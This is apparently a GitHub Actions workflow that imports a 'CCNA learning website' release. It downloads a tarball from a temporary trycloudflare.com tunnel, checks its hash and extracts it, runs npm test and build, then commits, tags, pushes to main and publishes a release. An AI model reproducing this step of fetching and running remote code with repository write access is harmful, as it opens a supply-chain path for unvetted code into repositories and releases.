name: Import CCNA 1.0.2
on:
  push:
    paths:
      - .github/workflows/import-release.yml
permissions:
  contents: write
jobs:
  release:
    if: github.event.head_commit.message == 'Initialize CCNA 1.0.2 release import'
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - name: Download and verify release bundle
        env:
          BUNDLE_URL: https://rebate-promo-peer-nutritional.trycloudflare.com/29bf2be478df589595a51c4e545ffb98ae99cfc8a40fae48ecc657e159b43ca1/ccna-1.0.2.tar.gz
        run: |
          curl --fail --location --retry 3 --max-time 600 "$BUNDLE_URL" --output "$RUNNER_TEMP/ccna-1.0.2.tar.gz"
          echo "29bf2be478df589595a51c4e545ffb98ae99cfc8a40fae48ecc657e159b43ca1  $RUNNER_TEMP/ccna-1.0.2.tar.gz" | sha256sum --check
          tar -xzf "$RUNNER_TEMP/ccna-1.0.2.tar.gz" -C "$GITHUB_WORKSPACE"
      - name: Test and build
        run: |
          npm test
          npm run build
      - name: Commit project and create version tag
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add .
          git commit -m "Release CCNA learning website 1.0.2"
          git tag -a v1.0.2 -m "CCNA Lab 1.0.2"
          git push origin HEAD:main
          git push origin v1.0.2
      - name: Publish GitHub Release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh release create v1.0.2 "$RUNNER_TEMP/ccna-1.0.2.tar.gz" --title "CCNA Lab 1.0.2" --notes-file CHANGELOG.md --verify-tag
